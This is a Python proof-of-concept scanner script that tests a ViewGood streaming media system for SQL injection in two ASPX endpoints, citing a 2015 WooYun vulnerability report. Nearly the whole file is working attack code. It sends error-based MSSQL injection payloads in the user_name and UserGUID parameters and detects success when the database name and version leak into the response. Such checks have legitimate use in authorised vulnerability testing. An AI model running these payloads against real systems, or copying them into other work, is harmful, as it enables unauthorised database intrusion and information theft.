#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 远古流媒体系统两处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0146427
author: Lucifer
description: 文件Request.aspx和UserDataSync.aspx中,POST参数存在SQL注入。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class viewgood_two_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "user_name":"'AnD(Db_Name()+ChAr(66)+ChAr(66)+ChAr(66)+@@VeRSioN)>0--"
        }
        payload = "/viewgood/Pc/Content/Request.aspx?action=name_check"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                cprint("[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data), "red")

            vulnurl = self.url + "/VIEWGOOD/ADI/portal/UserDataSync.aspx"
            post_data = {
                "UserGUID":"1'AnD(Db_Name()+ChAr(66)+ChAr(66)+ChAr(66)+@@VeRSioN)>0--"
            }
            req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                cprint("[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = viewgood_two_sqli_BaseVerify(sys.argv[1])
    testVuln.run()